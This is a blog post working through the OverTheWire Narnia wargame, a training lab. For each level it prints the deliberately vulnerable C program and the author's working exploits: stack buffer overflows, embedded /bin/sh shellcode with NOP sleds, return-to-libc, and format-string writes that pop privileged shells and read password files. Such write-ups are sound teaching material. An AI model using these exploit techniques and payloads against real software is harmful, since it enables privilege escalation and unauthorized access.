---
layout: post
title:  "OverTheWire: Narnia Writeup"
date:   2017-02-20 9:00:00 -0500
categories: exploits exercises
---
I had some extra free time this month with the Lab closing twice due to the
snow. I used one of these days to modernize my blog and website and the other,
the subject of this post, I spent working through the [Narnia] wargame. For
those of you unfamiliar, [OverTheWire] hosts a number of "wargames" - series of
exploitation challenges that vary in difficulty from "never touched a command
line in my life" to "write an exploit for a modern version of gzip". [Narnia]
is one of the simpler binary exploitation series with only a few levels so I
thought I'd try and tackle it on my day off.

![otw-logo]({{ site.baseurl }}/img/otw-narnia/otw-logo.png)

_Warning: this blog post contains solutions to the [Narnia] wargame. If you're
interested in solving it yourself DO NOT READ THIS. Passwords have been
redacted with XXXXXXXXXX._

### Challenges

* [level0](#level0)
* [level1](#level1)
* [level2](#level2)
* [level3](#level3)
* [level4](#level4)
* [level5](#level5)
* [level6](#level6)
* [level7](#level7)
* [level8](#level8)
* [level9](#level9)

## Level0 {#level0}

SSH to `narnia0@narnia.labs.overthewire.org` with password `narnia0` - easy enough.

## Level0 &rarr; Level1 {#level1}

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>

int main(){
        long val=0x41414141;
        char buf[20];

        printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
        printf("Here is your chance: ");
        scanf("%24s",&buf);

        printf("buf: %s\n",buf);
        printf("val: 0x%08x\n",val);

        if(val==0xdeadbeef)
                system("/bin/sh");
        else {
                printf("WAY OFF!!!!\n");
                exit(1);
        }

        return 0;
}
{% endhighlight %}

This is as simple as buffer overflows get - `buf` is 20 bytes long but the
`scanf` reads in 24 bytes, allowing you to overwrite the next value on the
stack - in this case `val`. If `val` is `0xdeadbeef` we get a shell. I didn't
bother writing a script for this one and used python to construct an input
string (making sure to reverse the order of bytes for `0xdeadbeef` since this
is a little endian system).

{% highlight bash %}
narnia0@melinda:/narnia$ python -c 'print "A"*20+"\xef\xbe\xad\xde"' | ./narnia0                          
Correct vals value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
val: 0xdeadbeef
narnia0@melinda:/narnia$ id
uid=14000(narnia0) gid=14000(narnia0) groups=14000(narnia0)
narnia0@melinda:/narnia$ 
{% endhighlight %}

Well, it looks like we're passing the value check - no "WAY OFF!!!!" message
but we still don't seem to have `narnia1` privileges... This is because the
bash `|` replaces `stdin` for `./narnia0` with a pipe from the `stdout` of my
python command. This causes `/bin/sh` to get an `EOF` after the python command
completes, closing the process before I can interact with it. We should be able
to pass it the command we want to execute after our python code via the same
pipe.

{% highlight bash %}
narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"'; echo "cat /etc/narnia_pass/narnia1") | ./narnia0 
Correct vals value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
XXXXXXXXXX
narnia0@melinda:/narnia$ 
{% endhighlight %}

Success, on to the next one.

## Level1 &rarr; Level2 {#level2}

{% highlight c %}
#include <stdio.h>

int main(){
        int (*ret)();

        if(getenv("EGG")==NULL){
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
        }

        printf("Trying to execute EGG!\n");
        ret = getenv("EGG");
        ret();

        return 0;
}
{% endhighlight %}

Looks like this one is walking us through putting shellcode in an environment
variable - it checks to see if `EGG` is set and, if so, jumps to its address
and executes its content. I generated a `/bin/sh` shellcode with [pwntools]
shellcraft module on my system.

{% highlight python %}
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> asm(shellcraft.i386.linux.sh())
'h\x01\x01\x01\x01\x814$ri\x01\x011\xd2Rj\x04Z\x01\xe2R\x89\xe2jhh///sh/binj\x0bX\x89\xe3\x89\xd1\x99\xcd\x80'
>>> 
{% endhighlight %}

We can then put this shellcode in a simple script that prints it to `stdout`,
save it to a tmp directory, and run `narnia1`, passing it our shellcode as an
environment variable.

{% highlight bash %}
narnia1@melinda:/narnia$ EGG=`python /tmp/forgottenwinter/egg.py` ./narnia1 
Trying to execute EGG!
$ id
uid=14001(narnia1) gid=14001(narnia1) euid=14002(narnia2) groups=14002(narnia2),14001(narnia1)
$ cat /etc/narnia_pass/narnia2
XXXXXXXXXX
{% endhighlight %}

Another one down.

## Level2 &rarr; Level3 {#level3}

{% highlight c %}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
        char buf[128];

        if(argc == 1){
                printf("Usage: %s argument\n", argv[0]);
                exit(1);
        }
        strcpy(buf,argv[1]);
        printf("%s", buf);

        return 0;
}
{% endhighlight %}

This one looks a lot more like a traditional buffer overflow. We've got a 128
byte buffer `buf` and we `strcpy` `argv[1]` directly into it with no bounds
checking. First, let's find how big our input buffer needs to be to give us
control of `eip`.

{% highlight bash %}
narnia2@melinda:/narnia$ gdb ./narnia2 
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) r `python -c 'print "A"*140+"BBBB"'`
Starting program: /games/narnia/narnia2 `python -c 'print "A"*140+"BBBB"'`

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
{% endhighlight %}

Great, looks like we can set `eip` after 140 bytes. Now we need somewhere to
store our shellcode. We might as well just use the same egg as the last level
and store it in an environment variable but we'll need to find it on the stack.
To give us some wiggle room, let's also add a sizable `nop` sled to the
beginning of our shellcode. My `egg.py` now looks like this:

{% highlight python %}
print '\x90'*2000+'h\x01\x01\x01\x01\x814$ri\x01\x011\xd2Rj\x04Z\x01\xe2R\x89\xe2jhh///sh/binj\x0bX\x89\xe3\x89\xd1\x99\xcd\x80'
{% endhighlight %}

We can find our shellcode using `gdb` by reading memory on the stack as strings
(I used a command like `x/500s $sp`) and scrolling until we start to see
environment variables and a ton of `nop`s.

{% highlight bash %}
0xffffd0a4:     ""
0xffffd0a5:     ""
0xffffd0a6:     "/games/narnia/narnia2"
0xffffd0bc:     "XDG_SESSION_ID=250067"
---Type <return> to continue, or q <return> to quit---
0xffffd0d2:     "SHELL=/bin/bash"
0xffffd0e2:     "TERM=screen"
0xffffd0ee:     "SSH_CLIENT=50.169.192.125 54062 22"
0xffffd111:     "SSH_TTY=/dev/pts/94"
0xffffd125:     "LC_ALL=C"
0xffffd12e:     "EGG=", '\220' <repeats 196 times>...
0xffffd1f6:     '\220' <repeats 200 times>...
0xffffd2be:     '\220' <repeats 200 times>...
0xffffd386:     '\220' <repeats 200 times>...
0xffffd44e:     '\220' <repeats 200 times>...
0xffffd516:     '\220' <repeats 200 times>...
0xffffd5de:     '\220' <repeats 200 times>...
0xffffd6a6:     '\220' <repeats 200 times>...
0xffffd76e:     '\220' <repeats 200 times>...
0xffffd836:     '\220' <repeats 200 times>...
0xffffd8fe:     "\220\220\220\220h\001\001\001\001\201\064$ri\001\001\061\322Rj\004Z\001\342R\211\342jhh///sh/binj\vX\211\343\211\321\231\315\200"
0xffffd930:     "USER=narnia2"
{% endhighlight %}

Looks like `0xffffd516` should be right in the middle of our `nop` sled. So
combining everything we've got so far...

{% highlight bash %}
narnia2@melinda:/narnia$ EGG=`python /tmp/docilelumberjack/egg.py` ./narnia2 `python -c 'print "A"*140+"\x16\xd5\xff\xff"'`
$ id
uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14003(narnia3),14002(narnia2)
$ cat /etc/narnia_pass/narnia3
XXXXXXXXXX
{% endhighlight %}

On to level4.

## Level3 &rarr; Level4 {#level4}

{% highlight c %}
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
{% endhighlight %}

There are a lot of potentially exploitable bugs here due to unbounded reads and
writes. However, since we're only looking for the password to `narnia4`,
there's no need to pop a shell - this code will copy a file for us if we can
give it the right input. Since the `strcpy` is unbounded, we can overflow the
`ifile` buffer and write into the `ofile` buffer - its just a matter of
crafting a string that gives us what we want. I started by moving into a `tmp`
directory and the following input worked for me.

{% highlight bash %}
narnia3@melinda:/tmp/ambitiousghost$ touch narnia4
narnia3@melinda:/tmp/ambitiousghost$ /narnia/narnia3 /././././././../etc/narnia_pass/narnia4
copied contents of /././././././../etc/narnia_pass/narnia4 to a safer place... (narnia4)
narnia3@melinda:/tmp/ambitiousghost$ cat narnia4 
XXXXXXXXXX
���4�}0,narnia3@melinda:/tmp/ambitiousghost$ 
{% endhighlight %}

First, we can create a file of the same name that we control (`narnia4`) in the
current directory. The file we want to read is in `/etc/narnia_pass/narnia4` so
we just need to pad this input with useless path junk so that it's just long
enough to overflow only the string `narnia4` into `ofile` - referring to the
`narnia4` file in the current directory. Since `read`/`write` don't adjust
permissions, we still have access to `narnia4` after it's written.

## Level4 &rarr; Level5 {#level5}

{% highlight c %}
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
        int i;
        char buffer[256];

        for(i = 0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));

        if(argc>1)
                strcpy(buffer,argv[1]);

        return 0;
}
{% endhighlight %}

It looks like this program was designed to defeat our environment variable
shellcode - before the `strcpy`, it nulls all environment variables. Instead,
we'll have to store our shellcode in the buffer itself. First, let's get
control of `eip`.

{% highlight bash %}
(gdb) r `python -c 'print "A"*272+"BBBB"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia4 `python -c 'print "A"*272+"BBBB"'`

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
{% endhighlight %}

Great, looks like 272 bytes will do the trick. Now, we need the address of of
`argv[1]` so we can jump there after filling it with shellcode.

{% highlight bash %}
0xffffd782:     ""
0xffffd783:     ""
0xffffd784:     "/games/narnia/narnia4"
0xffffd79a:     'A' <repeats 200 times>...
0xffffd862:     'A' <repeats 72 times>, "BBBB"
0xffffd8af:     "XDG_SESSION_ID=250351"
{% endhighlight %}

Looks like `argv[1]` starts at `0xffffd79a` - we should have what we need to
write an exploit string. I wrote a script for this one because the command
line input was getting a bit long.

{% highlight python %}
import struct

shellcode = 'h\x01\x01\x01\x01\x814$ri\x01\x011\xd2Rj\x04Z\x01\xe2R\x89\xe2jhh///sh/binj\x0bX\x89\xe3\x89\xd1\x99\xcd\x80'
address = 0xffffd79a

buf = shellcode
buf += 'A'*(272-len(shellcode))
buf += struct.pack("<I", address)

print buf
{% endhighlight %}

{% highlight bash %}
narnia4@melinda:/tmp/intricatetrigger$ /narnia/narnia4 `python exploit.py`
$ id
uid=14004(narnia4) gid=14004(narnia4) euid=14005(narnia5) groups=14005(narnia5),14004(narnia4)
$ cat /etc/narnia_pass/narnia5
XXXXXXXXXX
{% endhighlight %}

There we go.

## Level5 &rarr; Level6 {#level6}

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
{% endhighlight %}

This seems to be a beginner formatstring exploit - the `snprintf` isn't
vulnerable to overflow here since `sizeof` is evaluated at compile time so it
can't be manipulated like `strlen`. Luckily, this program provides us with some
helpful output if we fail to get a shell. Let's start by feeding it some `%x`s.

{% highlight bash %}
narnia5@melinda:/narnia$ ./narnia5 `python -c 'print "AAAA"+"%x."*5'`
Change is value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7eb7746.ffffffff.ffffd6ae.f7e2fc34.41414141.] (49)
i = 1 (0xffffd6cc)
{% endhighlight %}

Great, so we know the `snprintf` is vulnerable since we're leaking memory
values, we know we get back to the beginning of our buffer `0x41414141` after 5
`%x`s, and we know the address of `i` that we want to write to. If we insert
the address of `i` at the beginning and replace the last `%x` with a `%n`, we
should be able to write to `i`.

{% highlight bash %}
narnia5@melinda:/narnia$ ./narnia5 `python -c 'print "\xcc\xd6\xff\xffAAAA"+"%x."*4+"%n"'`
Change is value from 1 -> 500. No way...let me give you a hint!
buffer : [��AAAAf7eb7746.ffffffff.ffffd6ae.f7e2fc34.] (44)
i = 44 (0xffffd6cc)
{% endhighlight %}

Awesome, so now it's just a matter of reading the right number of characters
before `%n` to set the value of `i` to 500. Adjusting the last `%x`, we can set
`i` and get the password.

{% highlight bash %}
narnia5@melinda:/narnia$ ./narnia5 `python -c 'print "\xcc\xd6\xff\xffAAAA"+"%x."*3+"%465x%n"'`
Change is value from 1 -> 500. GOOD
$ id   
uid=14005(narnia5) gid=14005(narnia5) euid=14006(narnia6) groups=14006(narnia6),14005(narnia5)
$ cat /etc/narnia_pass/narnia6
XXXXXXXXXX
{% endhighlight %}

## Level6 &rarr; Level7 {#level7}

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
        __asm__("movl %esp,%eax\n\t"
                        "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        fp(b1);

        exit(1);
}
{% endhighlight %}

It looks like we've got a writable function pointer `fp` via overflowing one of
the two buffers in a `strcpy`. However, in addition to zeroing environment
variables, this challenge tries to detect if `fp` points to an address on the
stack and quits if it does - which means we can't just jump to our shellcode in
`argv` like we did last time.

Fortunately, we have control of a function pointer that gets called and one
argument passed to it - we could call `system("/bin/sh")` if we can find the
address of `system`, classic return to libc. We can get it by opening `narnia6`
in a debugger.

{% highlight bash %}
narnia6@melinda:/narnia$ gdb ./narnia6 
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x804855d
(gdb) r
Starting program: /games/narnia/narnia6 

Breakpoint 1, 0x0804855d in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e62e70 <system>
{% endhighlight %}

Great, so we need to overwrite `fp` with `0xf7e62e70` and set `b1` to
`"/bin/sh"`. We'll use two overflows, so that we can get the null byte at the
end of `"/bin/sh"` in the right place.

{% highlight bash %}
narnia6@melinda:/narnia$ ./narnia6 `python -c 'print "A"*8+"\x70\x2e\xe6\xf7"'` AAAAAAAA/bin/sh
$ id
uid=14006(narnia6) gid=14006(narnia6) euid=14007(narnia7) groups=14007(narnia7),14006(narnia6)
$ cat /etc/narnia_pass/narnia7
XXXXXXXXXX
{% endhighlight %}

## Level7 &rarr; Level8 {#level8}

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
        fflush(stdout);
        system("/bin/sh");

        return 0;
}
{% endhighlight %}

This looks like another formatstring exploit - the `snprintf` in `vuln` uses
raw user input for a format. This time, we want to write `ptrf` to point to
`hackedfunction` instead of `goodfunction` before it is called. Luckily, the
program gives us all the addresses we need if we just run it.

{% highlight bash %}
narnia7@melinda:/narnia$ ./narnia7 foo
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
{% endhighlight %}

So we want to change the value of `ptrf` at `0xffffd61c` from `0x80486e0` to
`0x8048706`, in other words, we want to write `0x8706` to the halfword
`0xffffd61c` using the format string vulnerability.

Let's start by using `ltrace` to find the address of our format string.

{% highlight bash %}
narnia7@melinda:/tmp/silentmoose$ ltrace /narnia/narnia7 `python -c 'print "AAAA"+"%x."*6'`
__libc_start_main(0x804868f, 2, 0xffffd764, 0x8048740 <unfinished ...>
memset(0xffffd620, '\0', 128)                                                                                                       = 0xffffd620
printf("goodfunction() = %p\n", 0x80486e0goodfunction() = 0x80486e0
)                                                                                          = 27
printf("hackedfunction() = %p\n\n", 0x8048706hackedfunction() = 0x8048706

)                                                                                      = 30
printf("before : ptrf() = %p (%p)\n", 0x80486e0, 0xffffd61cbefore : ptrf() = 0x80486e0 (0xffffd61c)
)                                                                        = 41
puts("I guess you want to come to the "...I guess you want to come to the hackedfunction...
)                                                                                         = 50
sleep(2)                                                                                                                            = 0
snprintf("AAAA8048238.ffffd678.f7ffda94.0."..., 128, "AAAA%x.%x.%x.%x.%x.%x.", 0x8048238, 0xffffd678, 0xf7ffda94, 0, 0x80486e0, 0x41414141) = 49
puts("Welcome to the goodfunction, but"...Welcome to the goodfunction, but i said the Hackedfunction..
)                                                                                         = 61
fflush(0xf7fcaac0)                                                                                                                  = 0
exit(0 <no return ...>
+++ exited (status 0) +++
{% endhighlight %}

Judging by the `snprintf` call it looks like we need 6 `%x`s before we reach
our string. Now we can prepend the address we want to write `0xffffd61c` and
replace the last `%x` with a `%hn`. We use `%hn` this time because we want to
write the lower half of `ptrf`.

With a bit of trial and error, I came up with the following explot string
script.

{% highlight python %}
import struct

address = 0xffffd61c
value = 0x8706

buf = struct.pack('<I', address)
buf += 'AAAA'
buf += '%x.'*4
buf += '%'+str(value-0x2b+1+0x6)+'x'
buf += '%hn'

print buf
{% endhighlight %}

{% highlight bash %}
narnia7@melinda:/tmp/silentmoose$ /narnia/narnia7 `python exploit.py`
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ id
uid=14007(narnia7) gid=14007(narnia7) euid=14008(narnia8) groups=14008(narnia8),14007(narnia7)
$ cat /etc/narnia_pass/narnia8
XXXXXXXXXX
{% endhighlight %}

On to the final challenge.

## Level8 &rarr; Level9 {#level9}

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am 
// making "i" global unti i find a fix 
// -morla 
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
                printf("%s argument\n", argv[0]);

        return 0;
}
{% endhighlight %}

I'll admit, this one had me stumped for quite a while. At first glance this
looks like a straightforward buffer overflow, I should be able to store some
shellcode in an environment variable, overflow the return address of `func`,
and jump to it. However, because `blah` is a local variable of `func`, it
resides on the stack which means that if we overflow `bok`, we'll start writing
into the address stored in `blah` before we can overwrite the return address.
Unfortunately, also because `blah` is a local variable, its position on the
stack isn't fixed and will depend on the environment variables, and string we
pass to the binary. Let's start by just naively overflowing `bok`.

{% highlight bash %}
narnia8@melinda:/tmp/negativemelody$ /narnia/narnia8 `python -c 'print "A"*200'`
AAAAAAAAAAAAAAAAAAAAA�
narnia8@melinda:/tmp/negativemelody$ /narnia/narnia8 `python -c 'print "A"*200'` | xxd
0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000010: 4141 4141 41d7 ffff 020a                 AAAAA.....
{% endhighlight %}

The program didn't segfault, but we did get some interesting output - the
contents of the `bok` buffer with the address `blah` appended to the end. This
address acts as a sort of canary - we need to write the correct value here or
the loop will stop and we won't be able to overwrite `eip`. We can see here
that we've overwritten the least significant byte of the address of `blah`.

{% highlight bash %}
narnia8@melinda:/tmp/omnipotentotter$ /narnia/narnia8 `python -c 'print "ABCDEFGHIJKLMNOPQRST"+"\x91\xd8\xff\xff"+"A"*12+"BBBB"'`      
ABCDEFGHIJKLMNOPQRST��AAAAAAAAAAAABBBB��
Segmentation fault
{% endhighlight %}

After some trial and error, I was able to generate a segfault at an address I
control. Using the same environment variable shellcode as the previous
challenge, I can pass its address in place of `BBBB`. 

{% highlight bash %}
narnia8@melinda:/tmp/omnipotentotter$ /narnia/narnia8 `python -c 'print "ABCDEFGHIJKLMNOPQRST"+"\x97\xd7\xff\xff"+"A"*12+"\xf1\xd8\xff\xff"'`
ABCDEFGHIJKLMNOPQRST��AAAAAAAAAAAA����
$ id
uid=14008(narnia8) gid=14008(narnia8) euid=14009(narnia9) groups=14009(narnia9),14008(narnia8)
$ cat /etc/narnia_pass/narnia9
XXXXXXXXXX
{% endhighlight %}

Success, and that's the end of the [Narnia] wargame.


[Narnia]: http://overthewire.org/wargames/narnia/
[OverTheWire]: http://overthewire.org
[pwntools]: https://github.com/Gallopsled/pwntools
